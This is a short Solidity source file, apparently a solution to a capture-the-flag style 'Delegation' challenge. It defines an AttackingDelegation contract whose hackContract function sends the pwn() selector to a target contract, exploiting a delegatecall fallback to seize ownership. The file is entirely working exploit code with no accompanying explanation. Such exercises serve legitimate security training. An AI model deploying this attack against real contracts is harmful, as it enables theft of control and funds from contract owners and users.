// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external returns (bool) {
        (bool success, ) = contractAddress.call(
            abi.encodeWithSelector(bytes4(keccak256("pwn()")))
        );

        return success;
    }
}
